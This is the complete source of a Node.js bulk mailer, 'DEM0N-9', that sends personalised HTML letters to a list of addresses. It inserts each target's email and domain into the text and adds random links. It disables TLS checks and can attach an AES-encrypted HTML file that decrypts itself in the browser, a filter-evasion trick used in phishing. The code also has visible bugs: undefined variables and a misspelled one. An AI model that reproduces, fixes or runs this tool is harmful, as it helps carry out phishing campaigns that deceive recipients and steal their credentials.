'use strict';
const nodemailer = require('nodemailer');
const chalk = require('chalk');
const delay = require('delay');
const _ = require('lodash');
const fs = require('fs');
const randomstring = require('randomstring');
const crypto = require('crypto-js');
const date = require('date-and-time');
const config = require("./config")

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "587";

async function checkSMTP(data) {
    try {
        let transporter = nodemailer.createTransport({
            pool: true,
            host: data.host,
            port: data.port,
            secure: data.secure,
            auth: {
                user: data.user,
                pass: data.pass
            }
        });
        await transporter.verify();
        return Promise.resolve(transporter);
    } catch(err) {
        return Promise.reject(`SMTP ERROR => ${err.message}`);
    }
}

async function readFrom(from, email, timezone) {
    try {
        from = from.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        from = from.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        from = from.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        from = from.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        from = from.replace(/DAY/g, timezoneSet(timezone, "d"));
        from = from.replace(/MONTH/g, timezoneSet(timezone, "m"));
        from = from.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        from = from.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        from = from.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        from = from.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        from = from.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        from = from.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        from = from.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        from = from.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        from = from.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        from = from.replace(/XXXEMAIL/g, email);
        from = from.replace(/CHAR1/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        from = from.replace(/CHAR2/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        from = from.replace(/CHAR3/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        from = from.replace(/CHAR4/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        from = from.replace(/CHAR5/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        from = from.replace(/CHAR6/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        from = from.replace(/CHAR7/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        from = from.replace(/CHAR8/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        from = from.replace(/CHAR9/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        from = from.replace(/CHAR10/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        from = from.replace(/CHAR20/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        from = from.replace(/NUMBER1/g, randomstring.generate({length: 1, charset: 'numeric'}));
        from = from.replace(/NUMBER2/g, randomstring.generate({length: 2, charset: 'numeric'}));
        from = from.replace(/NUMBER3/g, randomstring.generate({length: 3, charset: 'numeric'}));
        from = from.replace(/NUMBER4/g, randomstring.generate({length: 4, charset: 'numeric'}));
        from = from.replace(/NUMBER5/g, randomstring.generate({length: 5, charset: 'numeric'}));
        from = from.replace(/NUMBER6/g, randomstring.generate({length: 6, charset: 'numeric'}));
        from = from.replace(/NUMBER7/g, randomstring.generate({length: 7, charset: 'numeric'}));
        from = from.replace(/NUMBER8/g, randomstring.generate({length: 8, charset: 'numeric'}));
        from = from.replace(/NUMBER9/g, randomstring.generate({length: 9, charset: 'numeric'}));
        from = from.replace(/NUMBER10/g, randomstring.generate({length: 10, charset: 'numeric'}));
        from = from.replace(/NUMBER20/g, randomstring.generate({length: 20, charset: 'numeric'}));
        return Promise.resolve(from);
    } catch(err) {
        return Promise.reject(err);
    }
}

function timezoneSet(timezone, get) {
    let nDate;
    const obj = {
        timeZone: timezone
    };
    if(get == "H") {
        obj.hour = '2-digit';
        obj.hour12 = false;
    } else if(get == "h") {
        obj.hour = '2-digit';
    } else if(get == "i") {
        obj.minute = '2-digit';
    } else if(get == "s") {
        obj.second = '2-digit';
    } else if(get == "d") {
        obj.day = 'numeric';
    } else if(get == "d") {
        obj.weekday = 'long';
    } else if(get == "m") {
        obj.month = 'long';
    } else if(get == "Y") {
        obj.year = 'numeric';
    } else if(get == "full") {
        obj.day = 'numeric';
        obj.month = 'long';
        obj.year = 'numeric';
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
        } else if(get == "full2") {
        obj.day = 'numeric';
        obj.month = 'numeric';
        obj.year = 'numeric';
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
    } else if(get == "jdate") {
        obj.weekday = 'short';
        obj.day = 'numeric';
        obj.month = 'long';
        obj.year = 'numeric';
    } else if(get == "jdate2") {
        obj.day = 'numeric';
        obj.month = 'numeric';
        obj.year = 'numeric';
    } else if(get == "fulltime24") {
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
        obj.hour12 = false;
    } else if(get == "fulltime12") {
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
    }
    nDate = new Date().toLocaleString('en-us', obj);
    return nDate;
}
async function readLetter(letter, email, timezone, base_href, randomlinks) {
    try {
        let sletter = await fs.readFileSync(letter, 'utf-8');
        sletter = sletter.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        sletter = sletter.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        sletter = sletter.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        sletter = sletter.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        sletter = sletter.replace(/DAY/g, timezoneSet(timezone, "d"));
        sletter = sletter.replace(/MONTH/g, timezoneSet(timezone, "m"));
        sletter = sletter.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        sletter = sletter.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        sletter = sletter.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        sletter = sletter.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        sletter = sletter.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        sletter = sletter.replace(/XXXEMAIL/g, email);
        sletter = sletter.replace(/BASE64EMAIL/g, Buffer.from(email).toString('base64'));
        sletter = sletter.replace(/CHAR1/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR2/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR3/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR4/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR5/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR6/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR7/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR8/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR9/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR10/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR20/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        sletter = sletter.replace(/NUMBER1/g, randomstring.generate({length: 1, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER2/g, randomstring.generate({length: 2, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER3/g, randomstring.generate({length: 3, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER4/g, randomstring.generate({length: 4, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER5/g, randomstring.generate({length: 5, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER6/g, randomstring.generate({length: 6, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER7/g, randomstring.generate({length: 7, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER8/g, randomstring.generate({length: 8, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER9/g, randomstring.generate({length: 9, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER10/g, randomstring.generate({length: 10, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER20/g, randomstring.generate({length: 20, charset: 'numeric'}));
        sletter = sletter.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        sletter = sletter.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        sletter = sletter.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        sletter = sletter.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
		randomlinks = randomlinks.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        randomlinks = randomlinks.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        randomlinks = randomlinks.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        randomlinks = randomlinks.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        randomlinks = randomlinks.replace(/DAY/g, timezoneSet(timezone, "d"));
        randomlinks = randomlinks.replace(/MONTH/g, timezoneSet(timezone, "m"));
        randomlinks = randomlinks.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        randomlinks = randomlinks.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        randomlinks = randomlinks.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        randomlinks = randomlinks.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        randomlinks = randomlinks.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        randomlinks = randomlinks.replace(/XXXEMAIL/g, email);
        randomlinks = randomlinks.replace(/BASE64EMAIL/g, Buffer.from(email).toString('base64'));
        randomlinks = randomlinks.replace(/CHAR1/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/CHAR2/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/CHAR3/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/CHAR4/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/CHAR5/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/CHAR6/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/CHAR7/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/CHAR8/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/CHAR9/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/CHAR10/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/CHAR20/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/NUMBER1/g, randomstring.generate({length: 1, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/NUMBER2/g, randomstring.generate({length: 2, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/NUMBER3/g, randomstring.generate({length: 3, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/NUMBER4/g, randomstring.generate({length: 4, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/NUMBER5/g, randomstring.generate({length: 5, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/NUMBER6/g, randomstring.generate({length: 6, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/NUMBER7/g, randomstring.generate({length: 7, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/NUMBER8/g, randomstring.generate({length: 8, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/NUMBER9/g, randomstring.generate({length: 9, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/NUMBER10/g, randomstring.generate({length: 10, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/NUMBER20/g, randomstring.generate({length: 20, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        randomlinks = randomlinks.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        randomlinks = randomlinks.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        randomlinks = randomlinks.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
		base_href = base_href.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        base_href = base_href.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        base_href = base_href.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        base_href = base_href.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        base_href = base_href.replace(/DAY/g, timezoneSet(timezone, "d"));
        base_href = base_href.replace(/MONTH/g, timezoneSet(timezone, "m"));
        base_href = base_href.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        base_href = base_href.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        base_href = base_href.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        base_href = base_href.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        base_href = base_href.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        base_href = base_href.replace(/XXXEMAIL/g, email);
        base_href = base_href.replace(/BASE64EMAIL/g, Buffer.from(email).toString('base64'));
        base_href = base_href.replace(/CHAR1/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        base_href = base_href.replace(/CHAR2/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        base_href = base_href.replace(/CHAR3/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        base_href = base_href.replace(/CHAR4/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        base_href = base_href.replace(/CHAR5/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        base_href = base_href.replace(/CHAR6/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        base_href = base_href.replace(/CHAR7/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        base_href = base_href.replace(/CHAR8/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        base_href = base_href.replace(/CHAR9/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        base_href = base_href.replace(/CHAR10/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        base_href = base_href.replace(/CHAR20/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        base_href = base_href.replace(/NUMBER1/g, randomstring.generate({length: 1, charset: 'numeric'}));
        base_href = base_href.replace(/NUMBER2/g, randomstring.generate({length: 2, charset: 'numeric'}));
        base_href = base_href.replace(/NUMBER3/g, randomstring.generate({length: 3, charset: 'numeric'}));
        base_href = base_href.replace(/NUMBER4/g, randomstring.generate({length: 4, charset: 'numeric'}));
        base_href = base_href.replace(/NUMBER5/g, randomstring.generate({length: 5, charset: 'numeric'}));
        base_href = base_href.replace(/NUMBER6/g, randomstring.generate({length: 6, charset: 'numeric'}));
        base_href = base_href.replace(/NUMBER7/g, randomstring.generate({length: 7, charset: 'numeric'}));
        base_href = base_href.replace(/NUMBER8/g, randomstring.generate({length: 8, charset: 'numeric'}));
        base_href = base_href.replace(/NUMBER9/g, randomstring.generate({length: 9, charset: 'numeric'}));
        base_href = base_href.replace(/NUMBER10/g, randomstring.generate({length: 10, charset: 'numeric'}));
        base_href = base_href.replace(/NUMBER20/g, randomstring.generate({length: 20, charset: 'numeric'}));
        base_href = base_href.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        base_href = base_href.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        base_href = base_href.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        base_href = base_href.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
		sletter = sletter.replace(/RANDOMLINK/g, randomlinks);
		sletter = sletter.replace(/BASEURL/g, Buffer.from(base_href).toString('base64'));
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject(err);
    }
}



async function readLetterAttachments(letter, email, timezone, base_href, randomlinks) {
    try {
        let sletter = await fs.readFileSync(letter, 'utf-8');
        sletter = sletter.replace(/HOUR24/g, timezoneSet(timezone, "H"));
        sletter = sletter.replace(/HOUR12/g, timezoneSet(timezone, "h"));
        sletter = sletter.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        sletter = sletter.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        sletter = sletter.replace(/DAY/g, timezoneSet(timezone, "d"));
        sletter = sletter.replace(/MONTH/g, timezoneSet(timezone, "m"));
        sletter = sletter.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        sletter = sletter.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        sletter = sletter.replace(/XXXEMAIL/g, email);
        sletter = sletter.replace(/BASE64EMAIL/g, Buffer.from(email).toString('base64'));
        sletter = sletter.replace(/CHAR1/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR2/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR3/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR4/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR5/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR6/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR7/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR8/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR9/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR10/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        sletter = sletter.replace(/CHAR20/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        sletter = sletter.replace(/NUMBER1/g, randomstring.generate({length: 1, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER2/g, randomstring.generate({length: 2, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER3/g, randomstring.generate({length: 3, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER4/g, randomstring.generate({length: 4, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER5/g, randomstring.generate({length: 5, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER6/g, randomstring.generate({length: 6, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER7/g, randomstring.generate({length: 7, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER8/g, randomstring.generate({length: 8, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER9/g, randomstring.generate({length: 9, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER10/g, randomstring.generate({length: 10, charset: 'numeric'}));
        sletter = sletter.replace(/NUMBER20/g, randomstring.generate({length: 20, charset: 'numeric'}));
        sletter = sletter.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        sletter = sletter.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        sletter = sletter.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        sletter = sletter.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject(err);
    }
}

async function readSubject(subject, email, timezone) {
    try {
        subject = subject.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        subject = subject.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        subject = subject.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        subject = subject.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        subject = subject.replace(/DAY/g, timezoneSet(timezone, "d"));
        subject = subject.replace(/MONTH/g, timezoneSet(timezone, "m"));
        subject = subject.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        subject = subject.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        subject = subject.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        subject = subject.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        subject = subject.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        subject = subject.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        subject = subject.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        subject = subject.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        subject = subject.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        subject = subject.replace(/XXXEMAIL/g, email);
        subject = subject.replace(/CHAR1/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        subject = subject.replace(/CHAR2/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        subject = subject.replace(/CHAR3/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        subject = subject.replace(/CHAR4/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        subject = subject.replace(/CHAR5/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        subject = subject.replace(/CHAR6/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        subject = subject.replace(/CHAR7/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        subject = subject.replace(/CHAR8/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        subject = subject.replace(/CHAR9/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        subject = subject.replace(/CHAR10/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        subject = subject.replace(/CHAR20/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        subject = subject.replace(/NUMBER1/g, randomstring.generate({length: 1, charset: 'numeric'}));
        subject = subject.replace(/NUMBER2/g, randomstring.generate({length: 2, charset: 'numeric'}));
        subject = subject.replace(/NUMBER3/g, randomstring.generate({length: 3, charset: 'numeric'}));
        subject = subject.replace(/NUMBER4/g, randomstring.generate({length: 4, charset: 'numeric'}));
        subject = subject.replace(/NUMBER5/g, randomstring.generate({length: 5, charset: 'numeric'}));
        subject = subject.replace(/NUMBER6/g, randomstring.generate({length: 6, charset: 'numeric'}));
        subject = subject.replace(/NUMBER7/g, randomstring.generate({length: 7, charset: 'numeric'}));
        subject = subject.replace(/NUMBER8/g, randomstring.generate({length: 8, charset: 'numeric'}));
        subject = subject.replace(/NUMBER9/g, randomstring.generate({length: 9, charset: 'numeric'}));
        subject = subject.replace(/NUMBER10/g, randomstring.generate({length: 10, charset: 'numeric'}));
        subject = subject.replace(/NUMBER20/g, randomstring.generate({length: 20, charset: 'numeric'}));
        return Promise.resolve(subject);
    } catch(err) {
        return Promise.reject(err);
    }
}

const randomLinks = () => {
    return config.links[Math.floor(Math.random() * config.links.length)]
}

(async function() {
    const now = new Date();
    var year = date.format(now, date.compile('YYYY'));
    console.log(chalk`
{bold.green - DEM0N-9}
{bold.white Coded by Silentc0der} in {bold.green ${year}}
    `);
    if (process.argv[2] == undefined) {
        console.log('Usage : node index.js listname.txt');
        process.exit(1);
    }
    const transporter = await checkSMTP(config.smtpConfig);
    console.log(chalk`{bold [!] SMTP Checked, ready to use !}\n`);
    console.log(chalk`{bold [>] Open list file, ${process.argv[2]}.}`);
    let mailist = await fs.readFileSync(process.argv[2], 'utf-8');
    let emailist = mailist.split(/\r?\n/);
    console.log(chalk`{bold [!] Found ${emailist.length} line.}\n`);
    emailist = _.chunk(emailist, 1);
    for(let i = 0; i < emailist.length; i++) {i
        await Promise.all(emailist[i].map(async(email) => {
            let randomlinks = randomLinks()
            if(email.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
                const doL = await readLetter(config.letter, email, config.timezone, config.base_href, randomlinks); // DONT TAMPER ONLY IF YOU UNDERSTAND IT.
                if(!config.from){
                    from = config.smtpConfig.user;
                } else {
                    form = config.from;
                }
                const doF = await readFrom(from, email);
                const doS = await readSubject(config.subject, email, config.timezone);
                const passwd = randomstring.generate({'charset': 'alphanumeric', length: 32});
				var file_string = "";
                if(config.use_attachment)
                {
                    let aesFile = await readLetterAttachments(__dirname+'/vm.html', email, config.timezone ,base_href).then((obj) => {file_string = obj;}); 
				    let encoded = crypto.AES.encrypt(file_string, passwd).toString();
                    var output = '<!doctype html><html><head><title>File</title><script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.js"></script><script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/aes.js"></script><script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/sha256.js"></script></head><body><script>var decrypted = CryptoJS.AES.decrypt("'+encoded+'", "'+passwd+'");document.write(decrypted.toString(CryptoJS.enc.Utf8));</script></html>';

                    try {
                        let mailConfig = {
                            from: doF,
                            html: doL,
                            subject: doS,
                            to: email,
                            priority: priority,
                            attachments: [{
                                filename: config.filename,
                                content: new Buffer.from(output, 'utf-8')
                            }]
                        };  
                        await transporter.sendMail(mailConfig);
                        console.log(chalk`{bold ${email} => SUCCESS}`);
                    } catch(err) {
                        console.log(chalk`{bold ${email} => ERROR : ${err.message}}`);
                    }
                }
                else {
                    try{
                        let mailConfig = {
                            from: doF,
                            html: doL,
                            subject: doS,
                            to: email,
                            priority: priority,
                        }
                        await transporter.sendMail(mailConfig);
                        console.log(chalk`{bold ${email} => SUCCESS}`);
                    }   catch(err) {
                        console.log(chalk`{bold ${email} => ERROR : ${err.message}}`);
                    }
                }
        };
        }));
    }
})();